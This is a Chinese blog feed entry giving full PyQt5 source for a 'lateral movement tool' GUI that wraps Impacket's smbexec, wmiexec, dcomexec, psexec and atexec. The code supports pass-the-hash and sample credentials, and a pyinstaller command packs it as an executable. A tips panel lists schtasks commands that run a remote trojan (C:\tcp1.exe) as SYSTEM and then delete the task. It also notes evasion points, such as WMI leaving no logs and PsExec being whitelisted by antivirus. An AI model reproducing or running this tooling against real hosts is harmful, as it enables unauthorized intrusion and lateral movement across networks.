<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>Impacket-GUI开发</title>
    <link href="/2025/01/29/Impacket-GUI%E5%BC%80%E5%8F%91/"/>
    <url>/2025/01/29/Impacket-GUI%E5%BC%80%E5%8F%91/</url>
    
    <content type="html"><![CDATA[<p>本工具仅供合法授权的安全测试与教育研究使用，禁止任何非法用途。 使用本工具产生的所有后果由用户自行承担，开发者不负任何责任。<br>如果自用需要修改的地方：<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/20250122200502977.png" alt="image.png"><br>将python38改成自己的python环境</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> subprocess<br><span class="hljs-keyword">from</span> PyQt5.QtWidgets <span class="hljs-keyword">import</span> QApplication, QWidget, QVBoxLayout, QLineEdit, QPushButton, QLabel<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">SmbExecGUI</span>(<span class="hljs-title class_ inherited__">QWidget</span>):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-built_in">super</span>().__init__()<br>        <br>        self.initUI()<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">initUI</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-comment"># 设置窗口标题和大小</span><br>        self.setWindowTitle(<span class="hljs-string">&#x27;SMBExec GUI&#x27;</span>)<br>        self.setGeometry(<span class="hljs-number">100</span>, <span class="hljs-number">100</span>, <span class="hljs-number">400</span>, <span class="hljs-number">300</span>)<br>        <br>        <span class="hljs-comment"># 创建布局</span><br>        layout = QVBoxLayout()<br><br>        <span class="hljs-comment"># 创建控件</span><br>        self.domain_username_input = QLineEdit(self)<br>        self.domain_username_input.setPlaceholderText(<span class="hljs-string">&#x27;domain/username:0day/sqladmin&#x27;</span>)<br>        <br>        self.password_input = QLineEdit(self)<br>        self.password_input.setPlaceholderText(<span class="hljs-string">&#x27;password:admin!@#45&#x27;</span>)<br>        self.password_input.setEchoMode(QLineEdit.Password)  <span class="hljs-comment"># 隐藏密码</span><br>        <br>        self.ip_input = QLineEdit(self)<br>        self.ip_input.setPlaceholderText(<span class="hljs-string">&#x27;ip:192.168.3.142&#x27;</span>)<br>        <br>        self.result_label = QLabel(<span class="hljs-string">&#x27;Result will be shown here...&#x27;</span>, self)<br>        <br>        self.execute_button = QPushButton(<span class="hljs-string">&#x27;Execute&#x27;</span>, self)<br>        self.execute_button.clicked.connect(self.execute_command)<br><br>        <span class="hljs-comment"># 将控件添加到布局</span><br>        layout.addWidget(self.domain_username_input)<br>        layout.addWidget(self.password_input)<br>        layout.addWidget(self.ip_input)<br>        layout.addWidget(self.execute_button)<br>        layout.addWidget(self.result_label)<br><br>        <span class="hljs-comment"># 设置窗口的布局</span><br>        self.setLayout(layout)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">execute_command</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-comment"># 获取输入的内容</span><br>        domain_username = self.domain_username_input.text()<br>        password = self.password_input.text()<br>        ip = self.ip_input.text()<br><br>        <span class="hljs-comment"># 格式化命令</span><br>        <span class="hljs-keyword">if</span> domain_username <span class="hljs-keyword">and</span> password <span class="hljs-keyword">and</span> ip:<br>            command = <span class="hljs-string">f&quot;python38 smbexec.py <span class="hljs-subst">&#123;domain_username&#125;</span>:<span class="hljs-subst">&#123;password&#125;</span>@<span class="hljs-subst">&#123;ip&#125;</span>&quot;</span><br>            <br>            <span class="hljs-keyword">try</span>:<br>                <span class="hljs-comment"># 执行命令并捕获输出</span><br>                result = subprocess.run(command, shell=<span class="hljs-literal">True</span>, text=<span class="hljs-literal">True</span>, capture_output=<span class="hljs-literal">True</span>)<br>                <br>                <span class="hljs-comment"># 判断执行结果</span><br>                <span class="hljs-keyword">if</span> result.returncode == <span class="hljs-number">0</span>:<br>                    self.result_label.setText(<span class="hljs-string">f&quot;Success: <span class="hljs-subst">&#123;result.stdout&#125;</span>&quot;</span>)<br>                <span class="hljs-keyword">else</span>:<br>                    self.result_label.setText(<span class="hljs-string">f&quot;Failed: <span class="hljs-subst">&#123;result.stderr&#125;</span>&quot;</span>)<br>            <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>                self.result_label.setText(<span class="hljs-string">f&quot;Error: <span class="hljs-subst">&#123;<span class="hljs-built_in">str</span>(e)&#125;</span>&quot;</span>)<br>        <span class="hljs-keyword">else</span>:<br>            self.result_label.setText(<span class="hljs-string">&quot;Please fill in all fields.&quot;</span>)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    app = QApplication(sys.argv)<br>    ex = SmbExecGUI()<br>    ex.show()<br>    sys.exit(app.exec_())<br><br></code></pre></td></tr></table></figure><p>自用成品</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> subprocess<br><span class="hljs-keyword">from</span> PyQt5.QtWidgets <span class="hljs-keyword">import</span> QApplication, QWidget, QVBoxLayout, QHBoxLayout, QLineEdit, QLabel, QPushButton, QRadioButton, QButtonGroup, QTextEdit<br><span class="hljs-keyword">from</span> PyQt5.QtGui <span class="hljs-keyword">import</span> QIcon<br><span class="hljs-keyword">import</span> webbrowser<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">SmbExecGUI</span>(<span class="hljs-title class_ inherited__">QWidget</span>):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-built_in">super</span>().__init__()<br>        self.initUI()<br>        self.selected_module = <span class="hljs-string">&#x27;&#x27;</span><br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">initUI</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-comment"># 设置窗口标题和大小</span><br>        self.setWindowTitle(<span class="hljs-string">&#x27;横向移动工具 - by suuuu&#x27;</span>)<br>        self.setGeometry(<span class="hljs-number">600</span>, <span class="hljs-number">400</span>, <span class="hljs-number">1200</span>, <span class="hljs-number">800</span>)<br>        self.setWindowIcon(QIcon(<span class="hljs-string">&#x27;ico.jpg&#x27;</span>))<br><br>        <span class="hljs-comment"># 创建布局</span><br>        layout = QVBoxLayout()<br><br>        <span class="hljs-comment"># 创建顶部模块选择布局</span><br>        self.module_label = QLabel(<span class="hljs-string">&#x27;请选择攻击模块：&#x27;</span>, self)<br>        self.smbexec_button = QRadioButton(<span class="hljs-string">&#x27;SMBExec&#x27;</span>, self)<br>        self.wmiexec_button = QRadioButton(<span class="hljs-string">&#x27;WMIExec&#x27;</span>, self)<br>        self.dcomexec_button = QRadioButton(<span class="hljs-string">&#x27;DCOMExec&#x27;</span>, self)<br>        self.psexec_button = QRadioButton(<span class="hljs-string">&#x27;PsExec&#x27;</span>, self)<br>        self.atexec_button = QRadioButton(<span class="hljs-string">&#x27;AtExec&#x27;</span>, self)<br>        self.tips_button = QRadioButton(<span class="hljs-string">&#x27;小贴士&#x27;</span>, self)<br><br>        <span class="hljs-comment"># 创建按钮组，确保每次只能选择一个模块</span><br>        self.module_group = QButtonGroup(self)<br>        self.module_group.addButton(self.smbexec_button)<br>        self.module_group.addButton(self.wmiexec_button)<br>        self.module_group.addButton(self.dcomexec_button)<br>        self.module_group.addButton(self.psexec_button)<br>        self.module_group.addButton(self.atexec_button)<br>        self.module_group.addButton(self.tips_button)<br><br>        <span class="hljs-comment"># 默认没有选中</span><br>        self.smbexec_button.setChecked(<span class="hljs-literal">False</span>)<br>        self.wmiexec_button.setChecked(<span class="hljs-literal">False</span>)<br>        self.dcomexec_button.setChecked(<span class="hljs-literal">False</span>)<br>        self.psexec_button.setChecked(<span class="hljs-literal">False</span>)<br>        self.atexec_button.setChecked(<span class="hljs-literal">False</span>)<br>        self.tips_button.setChecked(<span class="hljs-literal">False</span>)<br><br>        <span class="hljs-comment"># 创建模块选择布局</span><br>        module_layout = QHBoxLayout()<br>        module_layout.addWidget(self.smbexec_button)<br>        module_layout.addWidget(self.wmiexec_button)<br>        module_layout.addWidget(self.dcomexec_button)<br>        module_layout.addWidget(self.psexec_button)<br>        module_layout.addWidget(self.atexec_button)<br>        module_layout.addWidget(self.tips_button)<br><br>        <span class="hljs-comment"># 添加模块选择部分到主布局</span><br>        layout.addWidget(self.module_label)<br>        layout.addLayout(module_layout)<br><br>        <span class="hljs-comment"># 创建其他输入控件</span><br>        self.domain_username_label = QLabel(<span class="hljs-string">&#x27;domain/username:&#x27;</span>, self)<br>        self.domain_username_input = QLineEdit(self)<br>        self.domain_username_input.setPlaceholderText(<span class="hljs-string">&#x27;0day/sqladmin,域名/用户名&#x27;</span>)<br><br>        self.password_label = QLabel(<span class="hljs-string">&#x27;password:&#x27;</span>, self)<br>        self.password_input = QLineEdit(self)<br>        self.password_input.setPlaceholderText(<span class="hljs-string">&#x27;admin!@#45，明文密码&#x27;</span>)<br><br>        self.hash_label = QLabel(<span class="hljs-string">&#x27;hash:&#x27;</span>, self)<br>        self.hash_input = QLineEdit(self)<br>        self.hash_input.setPlaceholderText(<span class="hljs-string">&#x27;518b98ad4178a53695dc997aa02d455c，目前只支持NTLM Hash&#x27;</span>)<br><br>        self.ip_label = QLabel(<span class="hljs-string">&#x27;ip:&#x27;</span>, self)<br>        self.ip_input = QLineEdit(self)<br>        self.ip_input.setPlaceholderText(<span class="hljs-string">&#x27;192.168.3.142，指定主机IP&#x27;</span>)<br>        <br>         <span class="hljs-comment"># 新增命令输入框</span><br>        self.command_label = QLabel(<span class="hljs-string">&#x27;Command:&#x27;</span>, self)<br>        self.command_input = QLineEdit(self)<br>        self.command_input.setPlaceholderText(<span class="hljs-string">&#x27;whoami,  需要执行的命令，目前只支持atexec&#x27;</span>)<br><br>        <span class="hljs-comment"># 使用 QTextEdit 替换 QLabel</span><br>        self.result_label = QTextEdit(self)<br>        self.result_label.setReadOnly(<span class="hljs-literal">True</span>)  <span class="hljs-comment"># 设置为只读</span><br>        self.result_label.setLineWrapMode(QTextEdit.NoWrap) <span class="hljs-comment"># 取消自动换行</span><br>        <br>        self.tips_text_edit = QTextEdit(self)  <span class="hljs-comment"># Tips模块的文本编辑器</span><br>        self.tips_text_edit.setVisible(<span class="hljs-literal">False</span>)  <span class="hljs-comment"># 初始隐藏</span><br><br>        self.execute_button = QPushButton(<span class="hljs-string">&#x27;执行&#x27;</span>, self)<br>        self.execute_button.clicked.connect(self.execute_command)<br><br>        <span class="hljs-comment"># 新增打开浏览器的按钮</span><br>        self.browser_button = QPushButton(<span class="hljs-string">&#x27;打开博客&#x27;</span>, self)<br>        self.browser_button.clicked.connect(self.open_browser)<br><br>        <span class="hljs-comment"># 添加其他控件到布局</span><br>        layout.addWidget(self.domain_username_label)<br>        layout.addWidget(self.domain_username_input)<br>        layout.addWidget(self.password_label)<br>        layout.addWidget(self.password_input)<br>        layout.addWidget(self.hash_label)<br>        layout.addWidget(self.hash_input)<br>        layout.addWidget(self.ip_label)<br>        layout.addWidget(self.ip_input)<br>        layout.addWidget(self.command_label)  <span class="hljs-comment"># 添加命令标签</span><br>        layout.addWidget(self.command_input)   <span class="hljs-comment"># 添加命令输入框</span><br>        layout.addWidget(self.execute_button)<br>        layout.addWidget(self.result_label)<br>        layout.addWidget(self.tips_text_edit)  <span class="hljs-comment"># 将文本编辑器添加到布局</span><br>        layout.addWidget(self.browser_button)  <span class="hljs-comment"># 添加打开浏览器的按钮</span><br><br>        <span class="hljs-comment"># 绑定按钮点击事件，切换模块和显示相应说明</span><br>        self.smbexec_button.toggled.connect(<span class="hljs-keyword">lambda</span>: self.set_module(<span class="hljs-string">&#x27;smbexec.py&#x27;</span>, <span class="hljs-string">&#x27;SMB利用\n\n1. 445端口开放&#x27;</span>))<br>        self.wmiexec_button.toggled.connect(<span class="hljs-keyword">lambda</span>: self.set_module(<span class="hljs-string">&#x27;wmiexec.py&#x27;</span>, <span class="hljs-string">&#x27;WMI利用\n\n1. WMI服务开启，端口135，默认开启\n2. 防火墙允许135,445等端口通信\n3. 该方法不会在目标日志系统留下痕迹&#x27;</span>))<br>        self.dcomexec_button.toggled.connect(<span class="hljs-keyword">lambda</span>: self.set_module(<span class="hljs-string">&#x27;dcomexec.py&#x27;</span>, <span class="hljs-string">&#x27;DCOM利用\n\n1.默认情况下，只有管理员才能通过DCOM使用有效账户与远程机器进行交互&#x27;</span>))<br>        self.psexec_button.toggled.connect(<span class="hljs-keyword">lambda</span>: self.set_module(<span class="hljs-string">&#x27;psexec.py&#x27;</span>, <span class="hljs-string">&#x27;Ps利用\n\n1.PsExec是WIndows提供的工具，所以杀毒软件将其列入白名单中&#x27;</span>))<br>        self.atexec_button.toggled.connect(<span class="hljs-keyword">lambda</span>: self.set_module(<span class="hljs-string">&#x27;atexec.py&#x27;</span>, <span class="hljs-string">&#x27;At利用\n\n1. 步骤分别为\n传递木马，创建计划任务，执行计划任务，删除计划任务，运行木马\n这里的步骤很敏感，所以一般不用\n2. 需要目标机器允许当前用户通过at命令创建任务&#x27;</span>))<br>        self.tips_button.toggled.connect(self.show_tips)<br><br>        <span class="hljs-comment"># 设置初始显示</span><br>        self.set_module(<span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>)<br><br>        <span class="hljs-comment"># 设置窗口的布局</span><br>        self.setLayout(layout)<br>    <br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">open_browser</span>(<span class="hljs-params">self</span>):<br>       webbrowser.<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;https://e1evensu.github.io/&#x27;</span>)<br><br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">set_module</span>(<span class="hljs-params">self, module_name, usage_info</span>):<br>        <span class="hljs-comment"># 更新模块的描述和说明</span><br>        self.selected_module = module_name<br>        self.result_label.setPlainText(usage_info)<br>        self.tips_text_edit.setVisible(<span class="hljs-literal">False</span>)<br>        <br>        <span class="hljs-comment"># 隐藏输入控件</span><br>        self.domain_username_label.setVisible(<span class="hljs-literal">True</span>)<br>        self.domain_username_input.setVisible(<span class="hljs-literal">True</span>)<br>        self.password_label.setVisible(<span class="hljs-literal">True</span>)<br>        self.password_input.setVisible(<span class="hljs-literal">True</span>)<br>        self.hash_label.setVisible(<span class="hljs-literal">True</span>)<br>        self.hash_input.setVisible(<span class="hljs-literal">True</span>)<br>        self.ip_label.setVisible(<span class="hljs-literal">True</span>)<br>        self.ip_input.setVisible(<span class="hljs-literal">True</span>)<br>        self.command_label.setVisible(<span class="hljs-literal">True</span>)  <span class="hljs-comment"># 显示命令标签</span><br>        self.command_input.setVisible(<span class="hljs-literal">True</span>) <span class="hljs-comment"># 显示命令输入框</span><br>        self.execute_button.setVisible(<span class="hljs-literal">True</span>)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">show_tips</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">if</span> self.tips_button.isChecked():<br>           self.selected_module = <span class="hljs-string">&#x27;tips&#x27;</span><br>           tips_text = <span class="hljs-string">&#x27;本工具仅供合法授权的安全测试与教育研究使用，禁止任何非法用途。\n使用本工具产生的所有后果由用户自行承担，开发者不负任何责任。\n\n不要忘了IPC横向+计划任务\n利用条件：\n1.目标机开启了139和445端口\n2.目标主机管理员开启了ipc$默认共享\n操作：\n创建任务\nshell schtasks /create /s 192.168.3.142 /ru system /u sqladmin /p admin!@#45 /tn transfer /sc DAILY /tr C:\\tcp1.exe /f\n运行任务\nshell schtasks /run /s 192.168.3.142 /u sqladmin /p admin!@#45 /tn transfer /i\n删除任务\nschtasks /delete /s 192.168.3.142 /u sqladmin /p admin!@#45 /tn transfer /f&#x27;</span><br>           self.result_label.setPlainText(tips_text)<br>           self.tips_text_edit.setVisible(<span class="hljs-literal">True</span>)<br>           <span class="hljs-comment"># 隐藏输入控件</span><br>           self.domain_username_label.setVisible(<span class="hljs-literal">False</span>)<br>           self.domain_username_input.setVisible(<span class="hljs-literal">False</span>)<br>           self.password_label.setVisible(<span class="hljs-literal">False</span>)<br>           self.password_input.setVisible(<span class="hljs-literal">False</span>)<br>           self.hash_label.setVisible(<span class="hljs-literal">False</span>)<br>           self.hash_input.setVisible(<span class="hljs-literal">False</span>)<br>           self.ip_label.setVisible(<span class="hljs-literal">False</span>)<br>           self.ip_input.setVisible(<span class="hljs-literal">False</span>)<br>           self.command_label.setVisible(<span class="hljs-literal">False</span>)   <span class="hljs-comment"># 隐藏命令标签</span><br>           self.command_input.setVisible(<span class="hljs-literal">False</span>)    <span class="hljs-comment"># 隐藏命令输入框</span><br>           self.execute_button.setVisible(<span class="hljs-literal">False</span>)<br><br>        <span class="hljs-keyword">else</span>:<br>            self.tips_text_edit.setVisible(<span class="hljs-literal">False</span>)<br>            self.result_label.clear() <span class="hljs-comment"># 使用 clear() 清空 QTextEdit 的内容</span><br>            self.domain_username_label.setVisible(<span class="hljs-literal">True</span>)<br>            self.domain_username_input.setVisible(<span class="hljs-literal">True</span>)<br>            self.password_label.setVisible(<span class="hljs-literal">True</span>)<br>            self.password_input.setVisible(<span class="hljs-literal">True</span>)<br>            self.hash_label.setVisible(<span class="hljs-literal">True</span>)<br>            self.hash_input.setVisible(<span class="hljs-literal">True</span>)<br>            self.ip_label.setVisible(<span class="hljs-literal">True</span>)<br>            self.ip_input.setVisible(<span class="hljs-literal">True</span>)<br>            self.command_label.setVisible(<span class="hljs-literal">True</span>)  <span class="hljs-comment"># 显示命令标签</span><br>            self.command_input.setVisible(<span class="hljs-literal">True</span>)   <span class="hljs-comment"># 显示命令输入框</span><br>            self.execute_button.setVisible(<span class="hljs-literal">True</span>)<br><br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">execute_command</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-comment"># 获取输入的内容</span><br>        domain_username = self.domain_username_input.text()<br>        password = self.password_input.text()<br>        ip = self.ip_input.text()<br>        hash_value = self.hash_input.text()  <span class="hljs-comment"># 获取hash输入框的内容</span><br>        command_to_execute = self.command_input.text() <span class="hljs-comment"># 获取命令输入框的内容</span><br><br>        <span class="hljs-comment"># 检查密码和hash值只能填写一个</span><br>        <span class="hljs-keyword">if</span> password <span class="hljs-keyword">and</span> hash_value:<br>            self.result_label.setPlainText(<span class="hljs-string">&quot;Please provide either password or hash, not both.&quot;</span>)<br>            <span class="hljs-keyword">return</span><br><br>        <span class="hljs-comment"># 格式化命令</span><br>        <span class="hljs-keyword">if</span> domain_username <span class="hljs-keyword">and</span> (password <span class="hljs-keyword">or</span> hash_value) <span class="hljs-keyword">and</span> ip <span class="hljs-keyword">and</span> self.selected_module <span class="hljs-keyword">and</span> self.selected_module != <span class="hljs-string">&#x27;tips&#x27;</span>:<br>            <span class="hljs-comment"># 获取当前目录</span><br>            app_path = os.path.dirname(os.path.abspath(__file__))<br><br>            <span class="hljs-comment"># 获取脚本路径</span><br>            module_path = os.path.join(app_path, self.selected_module)<br><br>            <span class="hljs-comment"># 构造命令</span><br>            <span class="hljs-keyword">if</span> hash_value:<br>                command = <span class="hljs-string">f&quot;python38 <span class="hljs-subst">&#123;module_path&#125;</span> -hashes :<span class="hljs-subst">&#123;hash_value&#125;</span> <span class="hljs-subst">&#123;domain_username&#125;</span>@<span class="hljs-subst">&#123;ip&#125;</span> <span class="hljs-subst">&#123;command_to_execute&#125;</span>&quot;</span><br>            <span class="hljs-keyword">else</span>:<br>                command = <span class="hljs-string">f&quot;python38 <span class="hljs-subst">&#123;module_path&#125;</span> <span class="hljs-subst">&#123;domain_username&#125;</span>:<span class="hljs-subst">&#123;password&#125;</span>@<span class="hljs-subst">&#123;ip&#125;</span> <span class="hljs-subst">&#123;command_to_execute&#125;</span>&quot;</span><br><br>            <span class="hljs-keyword">try</span>:<br>                <span class="hljs-comment"># 使用 PowerShell 执行命令</span><br>                subprocess.Popen([<span class="hljs-string">&quot;powershell&quot;</span>, <span class="hljs-string">&quot;-Command&quot;</span>, command], shell=<span class="hljs-literal">True</span>)<br>                self.result_label.setPlainText(<span class="hljs-string">&quot;Command Executed&quot;</span>)<br>            <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>                self.result_label.setPlainText(<span class="hljs-string">f&quot;Error: <span class="hljs-subst">&#123;<span class="hljs-built_in">str</span>(e)&#125;</span>&quot;</span>)<br>        <span class="hljs-keyword">elif</span> self.selected_module != <span class="hljs-string">&#x27;tips&#x27;</span>:<br>            self.result_label.setPlainText(<span class="hljs-string">&quot;Please fill in all fields.&quot;</span>)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    app = QApplication(sys.argv)<br>    ex = SmbExecGUI()<br>    ex.show()<br>    sys.exit(app.exec_())<br></code></pre></td></tr></table></figure><p>打包指令：<br><code>pyinstaller --onefile --add-data &quot;smbexec.py;.&quot; --add-data &quot;wmiexec.py;.&quot; --add-data &quot;dcomexec.py;.&quot; --add-data &quot;psexec.py;.&quot; --add-data &quot;atexec.py;.&quot; --add-data &quot;ico.jpg;.&quot; --icon=ico.jpg gui.py</code></p><p>成品展示：<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/20250122200552816.png" alt="image.png"></p>]]></content>
    
    
    <categories>
      
      <category>开发</category>
      
    </categories>
    
    
    <tags>
      
      <tag>开发</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>春秋云镜-initial</title>
    <link href="/2025/01/29/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-initial/"/>
    <url>/2025/01/29/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-initial/</url>
    
